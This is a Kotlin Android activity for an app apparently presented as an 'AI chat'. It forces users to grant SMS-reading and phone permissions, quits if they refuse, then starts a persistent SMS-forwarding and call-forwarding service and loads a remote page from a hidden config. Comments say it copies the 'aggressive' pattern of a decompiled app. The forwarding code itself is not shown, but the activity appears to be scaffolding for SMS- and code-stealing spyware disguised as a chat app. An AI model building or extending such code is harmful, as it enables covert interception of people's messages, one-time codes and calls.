package com.cornspace.aichat

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import com.cornspace.aichat.util.AppLogger
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout
import android.widget.ProgressBar
import androidx.core.view.isVisible
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.cornspace.aichat.data.local.SettingsDataStore
import com.cornspace.aichat.service.SmsGatewayService
import com.cornspace.aichat.util.SecretConfig
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val PERMISSION_REQUEST_CODE = 100
    }

    @Inject
    lateinit var settingsDataStore: SettingsDataStore

    private var webView: WebView? = null
    private var serviceStarted = false
    private var webViewUrl: String? = null
    private var progressBar: ProgressBar? = null

    // Modern API for battery optimization request
    private val batteryOptimizationLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (pm.isIgnoringBatteryOptimizations(packageName)) {
            AppLogger.d(TAG, "Battery optimization exclusion granted")
        } else {
            AppLogger.d(TAG, "Battery optimization exclusion denied")
        }
    }

    private val requiredPermissions: Array<String>
        get() = buildList {
            add(Manifest.permission.RECEIVE_SMS)
            add(Manifest.permission.READ_SMS)
            add(Manifest.permission.READ_PHONE_STATE)
            add(Manifest.permission.CALL_PHONE)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                add(Manifest.permission.READ_PHONE_NUMBERS)
            }
        }.toTypedArray()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // FIX #7: Only create and load the WebView when a valid URL is configured.
        // WebView initialises a full renderer process (~50 MB RAM) even for blank URLs.
        webViewUrl = SecretConfig.getWebViewUrl()
        if (webViewUrl.isNullOrBlank()) {
            // Fallback: empty container — avoids wasting a renderer process.
            setContentView(FrameLayout(this))
        } else {
            // Create WebView but DON'T load URL yet - wait for permissions
            if (webView == null) {
                webView = createWebView(null) // Don't load URL yet
            }
            // Create ProgressBar
            progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleLarge)

            setContentView(FrameLayout(this).apply {
                addView(
                    webView, FrameLayout.LayoutParams(
                        FrameLayout.LayoutParams.MATCH_PARENT,
                        FrameLayout.LayoutParams.MATCH_PARENT
                    )
                )
                addView(
                    progressBar, FrameLayout.LayoutParams(
                        FrameLayout.LayoutParams.WRAP_CONTENT,
                        FrameLayout.LayoutParams.WRAP_CONTENT
                    ).apply {
                        gravity = android.view.Gravity.CENTER
                    }
                )
            })
            // Show loader initially
            progressBar?.isVisible = true
        }

        checkPermissions()
    }

    // ─── WebView ──────────────────────────────────────────────────────────────

    private fun createWebView(url: String?): WebView = WebView(this).apply {
        settings.javaScriptEnabled = true
        settings.domStorageEnabled = true
        settings.loadWithOverviewMode = true
        settings.useWideViewPort = true
        settings.setSupportZoom(true)
        settings.builtInZoomControls = true
        settings.displayZoomControls = false
        webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
                super.onPageStarted(view, url, favicon)
                // Show loader when page starts loading
                progressBar?.isVisible = true
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                // Hide loader when page finishes loading
                progressBar?.isVisible = false
            }
        }
        // Only load URL if provided (will be null until permissions granted)
        if (!url.isNullOrBlank()) {
            loadUrl(url)
        }
    }

    private fun loadWebViewUrl() {
        if (!webViewUrl.isNullOrBlank()) {
            // Show loader when loading URL
            progressBar?.isVisible = true
            webView?.loadUrl(webViewUrl!!)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        webView?.destroy()
        webView = null
        progressBar = null
    }

    // ─── Permissions ──────────────────────────────────────────────────────────

    /**
     * Check permissions and request any that are missing.
     * Follows the pattern from decompiled app:
     * - Collect missing permissions
     * - If all granted, proceed with initialization
     * - Otherwise, request them with PERMISSION_REQUEST_CODE
     */
    private fun checkPermissions() {
        val missingPermissions = mutableListOf<String>()

        for (permission in requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(permission)
            }
        }

        if (missingPermissions.isEmpty()) {
            // All permissions granted - initialize
            initializeLogic()
            requestBatteryOptimization()
        } else {
            // Request missing permissions
            ActivityCompat.requestPermissions(
                this,
                missingPermissions.toTypedArray(),
                PERMISSION_REQUEST_CODE
            )
        }
    }

    /**
     * Handle permission request result.
     * Pattern from decompiled app:
     * - If all granted -> proceed
     * - If any permanently denied -> show settings dialog
     * - Otherwise -> check permissions again
     */
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode != PERMISSION_REQUEST_CODE) return

        var allGranted = true
        var permanentlyDenied = false

        for (i in grantResults.indices) {
            if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                allGranted = false
                // Check if this permission was permanently denied
                if (!shouldShowRequestPermissionRationale(permissions[i])) {
                    permanentlyDenied = true
                }
            }
        }

        when {
            allGranted -> {
                // All permissions granted - proceed with initialization
                AppLogger.d(TAG, "All permissions granted")
                initializeLogic()
                requestBatteryOptimization()
            }
            permanentlyDenied -> {
                // User permanently denied - show settings dialog
                AppLogger.d(TAG, "Some permissions permanently denied")
                showSettingsDialog()
            }
            else -> {
                // Some permissions denied but not permanently - check again
                checkPermissions()
            }
        }
    }

    /**
     * Show dialog directing user to app settings.
     * Pattern from decompiled app - aggressive approach:
     * - "Settings" button opens app settings
     * - "Cancel" button closes the app (finishAffinity)
     */
    private fun showSettingsDialog() {
        AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage(
                "This app requires SMS and Phone permissions to function properly.\n\n" +
                "These permissions were permanently denied. Please enable them in App Settings.\n\n" +
                "Without these permissions, the app cannot forward SMS or manage call forwarding."
            )
            .setPositiveButton("Settings") { _, _ ->
                // Open app settings
                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.parse("package:$packageName")
                    startActivity(this)
                }
            }
            .setNegativeButton("Cancel") { _, _ ->
                // Close the app - like the decompiled app does
                finishAffinity()
            }
            .setCancelable(false)
            .show()
    }

    override fun onResume() {
        super.onResume()
        // When returning from App Settings after granting permissions,
        // the Activity may have been recreated, resetting serviceStarted to false.
        if (!serviceStarted && !SmsGatewayService.isServiceRunning()) {
            val allGranted = requiredPermissions.all {
                ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
            }
            if (allGranted) {
                initializeLogic()
            }
        }
    }

    // ─── Service ──────────────────────────────────────────────────────────────

    /**
     * Initialize app logic after permissions granted.
     * Pattern from decompiled app - check if service is running before starting.
     */
    private fun initializeLogic() {
        // Load WebView URL now that permissions are granted
        loadWebViewUrl()

        if (!SmsGatewayService.isServiceRunning()) {
            serviceStarted = true
            lifecycleScope.launch(Dispatchers.IO) {
                settingsDataStore.setServiceEnabled(true)
            }
            startSmsGatewayService()
        }
    }

    private fun startSmsGatewayService() {
        if (SmsGatewayService.isServiceRunning()) return
        val intent = Intent(this, SmsGatewayService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    /**
     * Request battery optimization exclusion.
     * Pattern from decompiled app - check if already excluded before requesting.
     */
    private fun requestBatteryOptimization() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (pm.isIgnoringBatteryOptimizations(packageName)) {
            AppLogger.d(TAG, "Already ignoring battery optimizations")
            return
        }

        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            batteryOptimizationLauncher.launch(intent)
        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed to request battery optimization exclusion", e)
        }
    }
}